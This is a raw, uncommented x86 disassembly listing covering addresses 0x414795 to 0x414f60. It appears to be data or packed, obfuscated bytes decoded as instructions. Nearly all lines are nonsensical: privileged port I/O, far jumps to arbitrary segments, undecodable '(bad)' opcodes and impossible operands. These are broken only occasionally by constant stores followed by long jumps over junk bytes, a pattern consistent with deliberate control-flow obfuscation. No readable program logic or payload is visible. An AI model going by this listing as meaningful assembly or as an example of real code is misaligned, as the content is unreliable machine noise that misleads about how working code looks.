  414795:	add    DWORD PTR [edx+0x72],0x22292bf6
  41479c:	lods   al,BYTE PTR ds:[esi]
  41479d:	pop    edx
  41479e:	mov    cl,0x25
  4147a0:	mov    DWORD PTR [esi],ebp
  4147a2:	and    dl,BYTE PTR [ecx]
  4147a4:	jmp    0x4147ae
  4147a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147a7:	test   DWORD PTR [ebp-0x22371b5d],edi
  4147ad:	sar    DWORD PTR [esi+0x13],1
  4147b0:	lea    ebp,[ecx+0x56]
  4147b3:	sahf   
  4147b4:	in     al,0x9e
  4147b6:	sub    eax,0x8df26dcf
  4147bb:	btr    DWORD PTR [ecx-0x520bba39],0x32
  4147c3:	add    BYTE PTR [eax],al
  4147c5:	mov    DWORD PTR [ebp-0x8],0x68b6
  4147cc:	mov    DWORD PTR [ebp-0x14],0x5186
  4147d3:	jmp    0x41489e
  4147d8:	inc    edx
  4147d9:	sti    
  4147da:	mov    ss,edi
  4147dc:	mov    edi,0xccff5bf7
  4147e1:	pop    esi
  4147e2:	test   eax,0xf72234a1
  4147e7:	sbb    al,0x7b
  4147e9:	in     eax,0x0
  4147eb:	add    BYTE PTR [esi-0x6e000000],ch
  4147f1:	mov    DWORD PTR [ecx],edi
  4147f3:	(bad)  
  4147f4:	mov    ?,WORD PTR [ecx+0x6563fdc5]
  4147fa:	inc    esi
  4147fb:	call   0xa93c:0x7ff640f4
  414802:	inc    edx
  414803:	popa   
  414804:	popa   
  414805:	mov    esp,0x7be4abd4
  41480a:	xchg   esi,eax
  41480b:	jg     0x4147f2
  41480d:	addr16 sub edx,esi
  414810:	jmp    0x7dcb:0xac1faf33
  414817:	or     BYTE PTR [edi+0x53],ch
  41481a:	sti    
  41481b:	xchg   ebx,ebp
  41481d:	sbb    BYTE PTR [edi+0x61],cl
  414820:	nop
  414821:	adc    dl,ah
  414823:	outs   dx,BYTE PTR ds:[esi]
  414824:	into   
  414825:	sub    al,0x77
  414827:	js     0x4148a0
  414829:	mov    WORD PTR [esp+esi*8+0x29],ss
  41482d:	or     al,0xd8
  41482f:	sbb    cl,BYTE PTR [esi]
  414831:	into   
  414832:	pop    ss
  414833:	add    DWORD PTR [ecx+0x7],ebx
  414836:	pushf  
  414837:	push   esp
  414838:	xchg   edx,eax
  414839:	cmp    BYTE PTR [esi+esi*4-0x6c],dh
  41483d:	xor    BYTE PTR [eax+0x2cc89e97],ah
  414843:	dec    esi
  414844:	fnstsw WORD PTR [esi]
  414846:	cmp    edi,DWORD PTR [eax+0x1ae37f39]
  41484c:	sub    eax,0xa5e831bc
  414851:	pop    ebx
  414852:	pop    esp
  414853:	sub    DWORD PTR [esi],edx
  414855:	sahf   
  414856:	push   ebp
  414857:	pop    es
  414858:	mov    bh,0x62
  41485a:	adc    edx,ebx
  41485c:	dec    esi
  41485d:	xchg   ecx,eax
  41485e:	aas    
  41485f:	clc    
  414860:	sub    eax,0xd8d60676
  414865:	push   esp
  414866:	pop    ax
  414868:	shr    ebx,cl
  41486a:	rol    BYTE PTR [ebp+0x17],0x72
  41486e:	xor    DWORD PTR [esi],edi
  414870:	pop    edx
  414871:	and    esi,DWORD PTR [edx]
  414873:	jmp    0x4148be
  414875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414876:	fild   WORD PTR [ecx]
  414878:	clc    
  414879:	adc    ah,bh
  41487b:	push   edx
  41487c:	inc    ebx
  41487d:	(bad)
  414882:	inc    edi
  414883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414884:	sub    ebp,DWORD PTR [ebx]
  414886:	mov    eax,0x3892a03b
  41488b:	adc    DWORD PTR [ebx-0x3d],esp
  41488e:	mov    dl,0xbe
  414890:	std    
  414891:	mov    dh,0x9c
  414893:	lock cmp dh,BYTE PTR [ecx+0x27]
  414897:	sub    al,0x0
  414899:	push   ds
  41489a:	jno    0x41485b
  41489c:	inc    edx
  41489d:	jns    0x414866
  41489f:	inc    ebp
  4148a0:	int3   
  4148a1:	mov    ebp,0xc700003a
  4148a6:	inc    ebp
  4148a7:	mov    ah,0xd6
  4148a9:	pop    ebp
  4148aa:	add    BYTE PTR [eax],al
  4148ac:	jmp    0x414977
  4148b1:	push   0x3d
  4148b3:	dec    eax
  4148b4:	inc    edx
  4148b5:	pop    edi
  4148b6:	ja     0x414922
  4148b8:	cmp    eax,0x74493da3
  4148bd:	ja     0x414909
  4148bf:	(bad)  
  4148c2:	out    0x0,al
  4148c4:	add    BYTE PTR [esi-0x10000000],ch
  4148ca:	xor    DWORD PTR [eax],eax
  4148cc:	cdq    
  4148cd:	test   al,0x3c
  4148cf:	mov    BYTE PTR [edi],dh
  4148d1:	xor    edx,DWORD PTR [esi+0xa]
  4148d4:	outs   dx,DWORD PTR ds:[esi]
  4148d5:	fnstcw WORD PTR [edi+eiz*2]
  4148d8:	mov    dl,BYTE PTR [esp+edi*4]
  4148db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148dc:	(bad)  [ebx+0x25]
  4148df:	retf   0xe448
  4148e2:	mov    ds:0x3720a053,eax
  4148e7:	inc    eax
  4148e8:	mov    ah,0x9f
  4148ea:	ficom  DWORD PTR [esi+0x41]
  4148ed:	pop    ecx
  4148ee:	dec    ecx
  4148ef:	(bad)  
  4148f0:	dec    eax
  4148f1:	inc    esi
  4148f2:	jbe    0x4148e1
  4148f4:	push   edx
  4148f5:	adc    BYTE PTR [eax-0x5a],ah
  4148f8:	aas    
  4148f9:	popa   
  4148fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148fb:	cmp    BYTE PTR [esi],0x16
  4148fe:	cld    
  4148ff:	adc    DWORD PTR [edi+0x1b],esi
  414902:	test   DWORD PTR [edx-0x2f1d29f1],esp
  414908:	pop    esp
  414909:	ja     0x414945
  41490b:	pop    ss
  41490c:	pop    ebx
  41490d:	cmp    esi,DWORD PTR [esi-0x7bf9b31f]
  414913:	mov    BYTE PTR [esi],bh
  414915:	ds (bad) 
  414917:	cwde   
  414918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414919:	cmc    
  41491a:	push   ecx
  41491b:	push   eax
  41491c:	cwde   
  41491d:	jmp    0x834c:0x80eaa4f3
  414924:	add    eax,0xb16629e9
  414929:	fstp   QWORD PTR [eax+edx*4-0x1e]
  41492d:	and    al,0xd
  41492f:	cmp    eax,ebp
  414931:	sub    ah,BYTE PTR ds:0x31e178aa
  414937:	jb     0x414935
  414939:	jno    0x4148ee
  41493b:	inc    esp
  41493c:	or     eax,0x95bc9066
  414941:	cmp    eax,0x1fae1c93
  414946:	lods   al,BYTE PTR ds:[esi]
  414947:	jl     0x4148e1
  414949:	pop    bp
  41494b:	inc    edx
  41494c:	and    DWORD PTR [esi-0x12cc68d],eax
  414952:	or     eax,0x738d900c
  414957:	popa   
  414958:	inc    ebx
  414959:	mov    ecx,0xfcde974
  41495e:	pop    ss
  41495f:	sub    bl,BYTE PTR [ebx]
  414961:	inc    ecx
  414962:	retf   0x1cf7
  414965:	inc    edx
  414966:	xchg   ebp,eax
  414967:	into   
  414968:	xchg   esi,eax
  414969:	jecxz  0x414915
  41496b:	mov    bl,ch
  41496d:	(bad)  [ecx-0x5abf46b3]
  414973:	outs   dx,DWORD PTR ds:[esi]
  414974:	xor    ecx,esp
  414976:	cwde   
  414977:	mov    DWORD PTR [ebp-0x24],0x5944
  41497e:	mov    DWORD PTR [ebp-0x2c],0x6e7a
  414985:	jmp    0x414a50
  41498a:	stos   DWORD PTR es:[edi],eax
  41498b:	dec    esp
  41498c:	mov    BYTE PTR [ecx+0x7ebbd5ef],dl
  414992:	ja     0x41492c
  414994:	in     al,0x6d
  414996:	pop    esi
  414997:	mov    al,0xe6
  414999:	(bad)  
  41499a:	xlat   BYTE PTR ds:[ebx]
  41499b:	out    0x0,al
  41499d:	add    BYTE PTR [esi+0x2f000000],ch
  4149a3:	leave  
  4149a4:	cmc    
  4149a5:	adc    BYTE PTR [ebx-0x2dfa1b65],al
  4149ab:	pusha  
  4149ac:	fbld   TBYTE PTR [edi]
  4149ae:	inc    esi
  4149af:	xlat   BYTE PTR ds:[ebx]
  4149b0:	ds mov ds,edx
  4149b3:	dec    ecx
  4149b4:	cmp    BYTE PTR [ebx+eax*4-0x2f],0x14
  4149b9:	addr16 (bad) 
  4149bb:	push   ecx
  4149bc:	clc    
  4149bd:	or     al,0x59
  4149bf:	mov    ah,0x20
  4149c1:	add    BYTE PTR [eax],ah
  4149c3:	cmp    eax,0xc9ef27b5
  4149c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149c9:	mov    dl,0xee
  4149cb:	fnstenv [ecx+eax*1+0x33]
  4149cf:	icebp  
  4149d0:	xchg   ebp,eax
  4149d1:	cmp    eax,ecx
  4149d3:	mov    eax,DWORD PTR ds:0x33cf1aaf
  4149d9:	and    eax,0x8cc2d67b
  4149de:	push   cs
  4149df:	loop   0x414a55
  4149e1:	clc    
  4149e2:	ret    
  4149e3:	sbb    dl,BYTE PTR [esi+ebx*2]
  4149e6:	sahf   
  4149e7:	lods   al,BYTE PTR ds:[esi]
  4149e8:	pop    edx
  4149e9:	ins    BYTE PTR es:[edi],dx
  4149ea:	sub    bl,ah
  4149ec:	inc    ebx
  4149ed:	xor    DWORD PTR [edx-0x55],0xe96f05b5
  4149f4:	add    ebp,edx
  4149f6:	imul   edx,DWORD PTR [edx+0x1f],0x7f
  4149fa:	add    dl,BYTE PTR [ebp+0x4a]
  4149fd:	mov    eax,ds:0x4fd8b192
  414a02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a03:	sub    edi,DWORD PTR [ebx-0x73]
  414a06:	out    0xd0,al
  414a08:	mov    esi,0xa327516f
  414a0d:	aad    0x84
  414a0f:	sub    edx,edx
  414a11:	pop    edi
  414a12:	and    BYTE PTR [ecx-0x7299b29f],0xf9
  414a19:	xchg   esi,eax
  414a1a:	mov    bl,0xeb
  414a1c:	aam    0xc8
  414a1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a1f:	shl    DWORD PTR [ebp-0x6d430d60],cl
  414a25:	outs   dx,BYTE PTR ds:[esi]
  414a26:	ror    BYTE PTR [eax+0x7d],1
  414a29:	repnz mov al,0x2c
  414a2c:	cmp    dh,bl
  414a2e:	jo     0x414a9d
  414a30:	pusha  
  414a31:	(bad)  
  414a32:	cli    
  414a33:	lahf   
  414a34:	jbe    0x414a46
  414a36:	jp     0x414ab5
  414a38:	adc    DWORD PTR [eax+0x708e470e],eax
  414a3e:	push   0xffffff84
  414a40:	cmp    BYTE PTR [edi],al
  414a42:	shl    BYTE PTR [esi+edi*2-0x3b69f686],1
  414a49:	inc    edi
  414a4a:	scas   eax,DWORD PTR es:[edi]
  414a4b:	retf   0x85c7
  414a4e:	pop    ss
  414a4f:	mov    eax,ds:0xf8b845c7
  414a54:	dec    ebp
  414a55:	add    BYTE PTR [eax],al
  414a57:	mov    DWORD PTR [ebp-0x40],0x58bb
  414a5e:	mov    DWORD PTR [ebp-0x38],0x30f6
  414a65:	mov    DWORD PTR [ebp-0x7c],0xeb1
  414a6c:	mov    DWORD PTR [ebp-0x5c],0x165a
  414a73:	mov    DWORD PTR [ebp-0x70],0x229b
  414a7a:	mov    DWORD PTR [ebp-0x54],0x818
  414a81:	jmp    0x414b4c
  414a86:	xchg   edi,eax
  414a87:	mov    ah,0x81
  414a89:	mov    dh,0xa3
  414a8b:	mov    bh,0xb7
  414a8d:	mov    ch,0xfa
  414a8f:	inc    edx
  414a90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a91:	pop    edi
  414a92:	mov    ebp,0x85a1785f
  414a97:	out    0x0,eax
  414a99:	add    BYTE PTR [esi+0x56000000],ch
  414a9f:	dec    ebx
  414aa0:	icebp  
  414aa1:	popa   
  414aa2:	push   ebp
  414aa3:	call   FWORD PTR [esi-0x148809b0]
  414aa9:	sbb    al,0xf2
  414aab:	std    
  414aac:	in     al,dx
  414aad:	add    DWORD PTR [eax+0x41af9277],esp
  414ab3:	ss dec ebx
  414ab5:	mov    ecx,0xc22e5219
  414aba:	and    edi,DWORD PTR gs:[edx-0x1a]
  414abe:	jmp    0x414a49
  414ac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ac1:	mov    bh,0x10
  414ac3:	fs dec ebp
  414ac5:	sub    bl,0x1f
  414ac8:	jl     0x414a5d
  414aca:	sbb    ebx,ecx
  414acc:	push   edx
  414acd:	and    eax,0xbce5a674
  414ad2:	test   eax,0xd6d8d8a2
  414ad7:	mov    DWORD PTR [eax-0x5b2f40fd],eax
  414add:	dec    esp
  414ade:	imul   edx,DWORD PTR [edi-0x47],0x5fa96a5a
  414ae5:	push   0x4d
  414ae7:	gs inc edx
  414ae9:	and    al,0x74
  414aeb:	sub    al,0x17
  414aed:	outs   dx,BYTE PTR ds:[esi]
  414aee:	test   al,0xd5
  414af0:	hlt    
  414af1:	xchg   edi,eax
  414af2:	push   ds
  414af3:	or     ecx,eax
  414af5:	inc    esp
  414af6:	dec    esi
  414af7:	rol    BYTE PTR [esi+0x629c7c3c],cl
  414afd:	lea    ebp,[ebx*8-0x31070ed3]
  414b04:	shl    DWORD PTR [eax-0x565cf3d0],0xb3
  414b0b:	mov    esi,0x6e257580
  414b10:	js     0x414b74
  414b12:	mov    eax,ds:0xc92d45c7
  414b17:	sbb    al,0xfa
  414b19:	xor    eax,0xf1dcfb76
  414b1e:	dec    ebp
  414b1f:	push   ds
  414b20:	mov    edx,0xb8fe4de7
  414b25:	mov    ch,0xcc
  414b27:	jb     0x414b73
  414b29:	int3   
  414b2a:	xor    BYTE PTR [edi],al
  414b2c:	sbb    al,0x3
  414b2e:	mov    ?,WORD PTR [edx-0x3370fd4c]
  414b34:	push   eax
  414b35:	icebp  
  414b36:	out    0x18,al
  414b38:	nop
  414b39:	xchg   ebx,edi
  414b3b:	and    al,0xb0
  414b3d:	pop    ecx
  414b3e:	leave  
  414b3f:	xchg   BYTE PTR ds:0x785f2709,dh
  414b45:	stos   DWORD PTR es:[edi],eax
  414b46:	mov    bh,0xda
  414b48:	pop    ds
  414b49:	pop    edx
  414b4a:	or     DWORD PTR [ebx+ecx*4],0x24b8ec4d
  414b51:	fdiv   st(7),st
  414b53:	jmp    FWORD PTR [ebx]
  414b55:	shr    ecx,0xc6
  414b58:	add    BYTE PTR [eax],al
  414b5a:	add    ah,cl
  414b5c:	push   cs
  414b5d:	mov    ss:0x6fddbbf6,eax
  414b63:	lods   al,BYTE PTR ds:[esi]
  414b64:	and    ecx,ebx
  414b66:	xchg   ebp,eax
  414b67:	mov    eax,ds:0x33335235
  414b6c:	call   0xef4b71
  414b71:	add    BYTE PTR [eax],al
  414b73:	xchg   ebp,eax
  414b74:	xchg   ebp,eax
  414b75:	cmp    ebx,esi
  414b77:	xor    DWORD PTR [ebx+0x4ef8c8c3],esp
  414b7d:	adc    esi,ebp
  414b7f:	ds jg  0x414ba1
  414b82:	mov    ss,WORD PTR [ebx-0x1b06de6b]
  414b88:	xor    ebx,DWORD PTR [edx+ecx*4+0x28]
  414b8c:	push   esi
  414b8d:	cmc    
  414b8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b8f:	mov    WORD PTR [eax+0x28b6f997],?
  414b95:	jecxz  0x414b78
  414b97:	mov    ch,0x7a
  414b99:	push   cs
  414b9a:	add    dl,BYTE PTR [ebx+0x26]
  414b9d:	das    
  414b9e:	xor    bl,BYTE PTR [ebx+edi*2-0x55b31a22]
  414ba5:	add    dl,BYTE PTR [ebp+0x7e60193a]
  414bab:	mov    edi,0xe0c0391b
  414bb0:	dec    esp
  414bb1:	iret   
  414bb2:	pop    eax
  414bb3:	xor    eax,0xa629690
  414bb8:	jns    0x414c0e
  414bba:	test   al,0xca
  414bbc:	das    
  414bbd:	retf   0x4a53
  414bc0:	mov    esi,0xfa806e5a
  414bc5:	add    ch,BYTE PTR [esp+esi*2-0x6]
  414bc9:	add    edi,esi
  414bcb:	xor    dh,0xaa
  414bce:	stos   DWORD PTR es:[edi],eax
  414bcf:	cdq    
  414bd0:	mov    DWORD PTR [ebx-0x42],ebp
  414bd3:	pop    ss
  414bd4:	mov    ds:0x2c3dd1f4,eax
  414bd9:	ret    
  414bda:	sub    eax,0x36f373f3
  414bdf:	sbb    esp,DWORD PTR [edx-0x23]
  414be2:	popa   
  414be3:	iret   
  414be4:	jnp    0x414ba5
  414be6:	xchg   BYTE PTR [edi+0x79a80029],bh
  414bec:	xchg   ebx,eax
  414bed:	or     cl,BYTE PTR [edx+0xdb6e902]
  414bf3:	cwde   
  414bf4:	xor    al,0xe8
  414bf6:	pop    es
  414bf7:	mov    edx,0x4794a709
  414bfc:	test   BYTE PTR ds:0x406c4b46,ah
  414c02:	sar    DWORD PTR [ebx-0x4c8e8c16],1
  414c08:	sahf   
  414c09:	punpckhwd mm3,QWORD PTR [eax+0x23]
  414c0d:	cmp    al,0xfa
  414c0f:	repz ret 
  414c11:	adc    DWORD PTR [edx],0xffffffe9
  414c14:	or     DWORD PTR [edx-0x7e52990],esp
  414c1a:	ror    BYTE PTR [esi+ebx*1-0x6b],0xe7
  414c1f:	inc    ebx
  414c20:	cmc    
  414c21:	add    eax,DWORD PTR [ebp-0x8]
  414c24:	xor    edx,edx
  414c26:	jmp    0x414cf1
  414c2b:	fidivr DWORD PTR ds:0xadff2898
  414c31:	cli    
  414c32:	call   edx
  414c34:	sub    al,0x13
  414c36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c37:	stc    
  414c38:	dec    eax
  414c39:	inc    ebp
  414c3a:	pop    edi
  414c3b:	loope  0x414c25
  414c3d:	add    BYTE PTR [eax],al
  414c3f:	scas   al,BYTE PTR es:[edi]
  414c40:	add    BYTE PTR [eax],al
  414c42:	add    BYTE PTR [esi-0xbd6973a],bl
  414c48:	xor    esi,esi
  414c4a:	sub    dl,cl
  414c4c:	fst    st(0)
  414c4e:	(bad)  [ecx-0x1c]
  414c51:	and    DWORD PTR [edi],edx
  414c53:	aas    
  414c54:	mov    bh,BYTE PTR [esi]
  414c56:	sar    DWORD PTR [ebx-0x3],1
  414c59:	fs sbb eax,0x6e8d2958
  414c5f:	inc    ebx
  414c60:	aad    0xa5
  414c62:	jo     0x414c31
  414c64:	icebp  
  414c65:	aad    0xcc
  414c67:	rcl    DWORD PTR [ecx],0x9
  414c6a:	xor    al,0x5d
  414c6c:	mov    ds:0x72399bf,al
  414c71:	inc    edi
  414c72:	stos   BYTE PTR es:[edi],al
  414c73:	pop    es
  414c74:	dec    esi
  414c75:	jnp    0x414cee
  414c77:	push   eax
  414c78:	sbb    ebp,DWORD PTR [esi-0x30b3fdd2]
  414c7e:	popf   
  414c7f:	jne    0x1ddb79f5
  414c85:	rol    bl,1
  414c87:	or     edx,DWORD PTR [edx+0x267e0b08]
  414c8d:	push   ecx
  414c8e:	push   ebp
  414c8f:	pop    esp
  414c90:	push   es
  414c91:	pusha  
  414c92:	adc    edx,DWORD PTR [edi-0x53272c5f]
  414c98:	(bad)  
  414c9a:	mov    edi,DWORD PTR [ebx+0x58]
  414c9d:	sbb    al,0x1
  414c9f:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  414ca1:	fldcw  WORD PTR [edi]
  414ca3:	mov    ebx,DWORD PTR [edi]
  414ca5:	retf   
  414ca6:	loop   0x414c54
  414ca8:	jno    0x414c4b
  414caa:	mov    ch,0x8f
  414cac:	add    eax,0xcea8627e
  414cb1:	cmc    
  414cb2:	jnp    0x414c7b
  414cb4:	sub    eax,0xb78b140
  414cb9:	lea    esp,[edx+0x37249908]
  414cbf:	jne    0x414cb0
  414cc1:	mov    esi,0x5f774ef2
  414cc6:	pop    es
  414cc7:	xlat   BYTE PTR ds:[ebx]
  414cc8:	jo     0x414c88
  414cca:	xchg   ebx,eax
  414ccb:	inc    eax
  414ccc:	push   esp
  414ccd:	xchg   edx,eax
  414cce:	add    eax,0x91203ca9
  414cd3:	adc    al,0x47
  414cd5:	mov    eax,ds:0xd488fb8c
  414cda:	inc    edx
  414cdb:	popa   
  414cdc:	mov    ds:0x19b6f66,eax
  414ce1:	lods   eax,DWORD PTR ds:[esi]
  414ce2:	lahf   
  414ce3:	retf   
  414ce4:	push   esi
  414ce5:	jns    0x414c76
  414ce7:	cmp    DWORD PTR [ebp+0x32ec749c],edi
  414ced:	das    
  414cee:	or     BYTE PTR [ecx-0x51],cl
  414cf1:	add    eax,DWORD PTR [ebp-0xc]
  414cf4:	mov    ecx,DWORD PTR [ebp-0x4]
  414cf7:	div    ecx
  414cf9:	xor    eax,0x2601
  414cfe:	add    eax,DWORD PTR [ebp-0x6c]
  414d01:	push   eax
  414d02:	jmp    0x414dcd
  414d07:	std    
  414d08:	or     DWORD PTR [ebp-0x30],0xadfddc7d
  414d0f:	mov    ebx,DWORD PTR [edi-0x38499ae3]
  414d15:	pop    esp
  414d16:	add    cl,BYTE PTR [edi-0x51ffff17]
  414d1c:	add    BYTE PTR [eax],al
  414d1e:	add    BYTE PTR [edx+0x4c05ba60],bl
  414d24:	in     eax,dx
  414d25:	repz inc eax
  414d27:	push   ss
  414d28:	push   esi
  414d29:	pushf  
  414d2a:	retf   0x4ea7
  414d2d:	ret    
  414d2e:	and    bh,BYTE PTR [ebp+0x3d603511]
  414d34:	cli    
  414d35:	shr    DWORD PTR [ebx+0x7d],0x38
  414d39:	mov    eax,ds:0x839b4869
  414d3e:	sub    ebx,edx
  414d40:	mov    esp,0xcbff10a6
  414d45:	mov    eax,ds:0xb3fe6c90
  414d4a:	inc    ebp
  414d4b:	pop    ebx
  414d4c:	push   eax
  414d4d:	mov    al,0xe5
  414d4f:	ds lock dec edx
  414d52:	ror    DWORD PTR [esi+0x72],1
  414d55:	mov    ecx,0x5b0c5abc
  414d5a:	test   dh,al
  414d5c:	adc    bl,ah
  414d5e:	dec    esi
  414d5f:	xchg   ebx,eax
  414d60:	pushf  
  414d61:	sbb    eax,0x1a94f38d
  414d66:	lods   al,BYTE PTR ds:[esi]
  414d67:	out    dx,eax
  414d68:	bound  edx,QWORD PTR [eax-0x66]
  414d6b:	mov    BYTE PTR [ecx-0x7b],dh
  414d6e:	in     al,0x18
  414d70:	int3   
  414d71:	dec    ebp
  414d72:	mov    dl,0x77
  414d74:	jo     0x414deb
  414d76:	push   ecx
  414d77:	jmp    0x414d78
  414d79:	cmp    eax,0xdaec8414
  414d7e:	js     0x414d16
  414d80:	xor    esp,esp
  414d82:	mov    ebp,0x59f5f9f7
  414d87:	in     al,dx
  414d88:	int    0x8f
  414d8a:	(bad)  
  414d8b:	push   ecx
  414d8c:	jle    0x414d78
  414d8e:	push   edi
  414d8f:	out    0x58,al
  414d91:	out    dx,al
  414d92:	xchg   ebx,edx
  414d94:	inc    ebx
  414d95:	or     eax,0x97277ed3
  414d9a:	(bad)  [ebx+0x7746e145]
  414da0:	xchg   BYTE PTR [edi+0xd],al
  414da3:	jecxz  0x414e18
  414da5:	cmp    al,0x41
  414da7:	aad    0xdf
  414da9:	or     DWORD PTR [eax+0x2b],ecx
  414dac:	gs mov ebp,0x1df6b910
  414db2:	fdivr  st(6),st
  414db4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414db5:	(bad)  
  414db6:	cmp    esi,DWORD PTR [ecx+0x14]
  414db9:	sub    eax,0xfbb4b0a7
  414dbe:	mov    ebx,0xe865eb77
  414dc3:	xor    DWORD PTR [edx+0x3a6bb0fa],ebx
  414dc9:	das    
  414dca:	cs dec esp
  414dcc:	mov    esp,0xe9b0458b
  414dd1:	mov    BYTE PTR [eax],0x0
  414dd4:	add    BYTE PTR ds:0xfe3daa61,dl
  414dda:	call   DWORD PTR [edi-0x46ff4297]
  414de0:	mov    eax,ds:0xa1d6606a
  414de5:	cmp    eax,0xae0000ea
  414dea:	add    BYTE PTR [eax],al
  414dec:	add    BYTE PTR ds:0x9dcd9d9a,bl
  414df2:	mov    eax,ds:0x552d2d81
  414df7:	add    al,0x31
  414df9:	adc    eax,DWORD PTR [edi+ecx*2+0xc09c633]
  414e00:	out    0x1f,eax
  414e02:	pop    ss
  414e03:	adc    eax,0x81409df1
  414e08:	scas   eax,DWORD PTR es:[edi]
  414e09:	sub    eax,0x46295744
  414e0e:	push   es
  414e0f:	leave  
  414e10:	pmaxub mm4,mm4
  414e13:	xchg   DWORD PTR [ebp-0x30],edi
  414e16:	icebp  
  414e17:	(bad)  
  414e18:	sbb    bh,dl
  414e1a:	icebp  
  414e1b:	dec    eax
  414e1c:	inc    esi
  414e1d:	das    
  414e1e:	xor    eax,0x230b68bb
  414e23:	cdq    
  414e24:	test   DWORD PTR [esp+edx*4-0xc3b7a08],ebp
  414e2b:	pop    ebp
  414e2c:	jb     0x414e95
  414e2e:	push   esp
  414e2f:	xlat   BYTE PTR ds:[ebx]
  414e30:	jbe    0x414e8c
  414e32:	ins    DWORD PTR es:[edi],dx
  414e33:	lds    ecx,FWORD PTR [edi]
  414e35:	enter  0x50d6,0xec
  414e39:	shl    DWORD PTR [ebp+0x75],1
  414e3c:	sbb    BYTE PTR [edx],al
  414e3e:	sahf   
  414e3f:	sahf   
  414e40:	and    BYTE PTR [ebp+0x5ffac32b],0x16
  414e47:	xchg   ecx,eax
  414e48:	loopne 0x414e9a
  414e4a:	push   esi
  414e4b:	inc    edi
  414e4c:	adc    eax,0xcf52df44
  414e51:	pop    es
  414e52:	stos   DWORD PTR es:[edi],eax
  414e53:	lods   eax,DWORD PTR ds:[esi]
  414e54:	push   ebx
  414e55:	cdq    
  414e56:	mov    DWORD PTR [ebp+ecx*8-0x12],eax
  414e5a:	cmp    cl,BYTE PTR gs:[edx-0x4]
  414e5e:	pushf  
  414e5f:	lock ror ah,cl
  414e62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e63:	cmp    ah,0xb5
  414e66:	dec    edi
  414e67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e68:	popa   
  414e69:	cmp    eax,0x3e439145
  414e6e:	pop    edx
  414e6f:	data16 arpl WORD PTR [edx-0x6b5598f8],dx
  414e76:	sbb    ecx,esp
  414e78:	sub    bl,BYTE PTR [esi]
  414e7a:	inc    edi
  414e7b:	jg     0x414e66
  414e7d:	jp     0x414eaa
  414e7f:	add    ebp,DWORD PTR [esp+ecx*2]
  414e82:	ss jecxz 0x414efa
  414e85:	js     0x414e1b
  414e87:	call   0x2ce8:0x52d86f89
  414e8e:	hlt    
  414e8f:	shr    DWORD PTR [eax-0x7f22fd4],1
  414e95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e96:	nop
  414e97:	add    eax,0x6971021c
  414e9c:	shr    BYTE PTR [edx+0x19],0x0
  414ea0:	add    cl,ch
  414ea2:	mov    BYTE PTR [eax],0x0
  414ea5:	add    BYTE PTR [ecx+edi*1-0x34003e8d],dl
  414eac:	mov    dh,0x7d
  414eae:	dec    ebx
  414eaf:	(bad)  
  414eb0:	outs   dx,DWORD PTR ds:[esi]
  414eb1:	in     al,0x93
  414eb3:	adc    al,0x33
  414eb5:	mov    edi,0xeaeb
  414eba:	scas   al,BYTE PTR es:[edi]
  414ebb:	add    BYTE PTR [eax],al
  414ebd:	add    BYTE PTR [ecx+eax*8-0x553df706],ch
  414ec4:	repnz inc eax
  414ec6:	and    DWORD PTR [esi],ebx
  414ec8:	clc    
  414ec9:	add    esp,0x5d
  414ecc:	fild   WORD PTR [eax]
  414ece:	outs   dx,DWORD PTR ds:[esi]
  414ecf:	jne    0x414eec
  414ed1:	jae    0x414ec7
  414ed3:	push   edx
  414ed4:	mov    WORD PTR [ecx+0x659e391f],cs
  414eda:	lea    esi,[ebx-0x6f9036c1]
  414ee0:	sub    BYTE PTR [ebx-0x4b21c724],cl
  414ee6:	sub    al,0xb7
  414ee8:	pop    ds
  414ee9:	push   cs
  414eea:	inc    edx
  414eeb:	out    dx,eax
  414eec:	mov    edx,0x38b827f7
  414ef1:	sub    BYTE PTR [ebx+0x6194e3b2],dl
  414ef7:	push   0x6f
  414ef9:	pop    ecx
  414efa:	or     BYTE PTR [ecx-0x18],al
  414efd:	ss repz ror ch,0x1e
  414f02:	test   DWORD PTR [edx],esi
  414f04:	not    DWORD PTR [ebx+0xa]
  414f07:	retf   0x1737
  414f0a:	push   es
  414f0b:	and    BYTE PTR [ebp-0xc],ah
  414f0e:	fld    DWORD PTR [edi]
  414f10:	dec    ecx
  414f11:	ins    DWORD PTR es:[edi],dx
  414f12:	jae    0x414f40
  414f14:	out    0xf6,eax
  414f16:	sbb    eax,0xc8c91ef4
  414f1b:	mov    dh,0xb2
  414f1d:	mov    ah,0x3
  414f1f:	(bad)  
  414f20:	fcomp  QWORD PTR [edx+edx*8+0x4a270887]
  414f27:	sti    
  414f28:	mov    ebx,0xfb42e18b
  414f2d:	xchg   ebx,eax
  414f2e:	or     al,BYTE PTR [ebx+0x56eeb67a]
  414f34:	icebp  
  414f35:	push   cs
  414f36:	xchg   esp,eax
  414f37:	test   al,0xbb
  414f39:	mov    ah,0x9b
  414f3b:	fs loope 0x414eda
  414f3e:	jns    0x414f72
  414f40:	(bad)  
  414f41:	daa    
  414f42:	add    DWORD PTR [ebp-0x12bf9838],0x6c29e1c1
  414f4c:	in     eax,0x39
  414f4e:	cmp    BYTE PTR [eax-0x3174ee46],bh
  414f54:	(bad)  
  414f55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f56:	fistp  DWORD PTR [ecx+0x63]
  414f59:	mov    esi,0x913532ec
  414f5e:	inc    ecx
  414f5f:	pop    ebp
  414f60:	das    
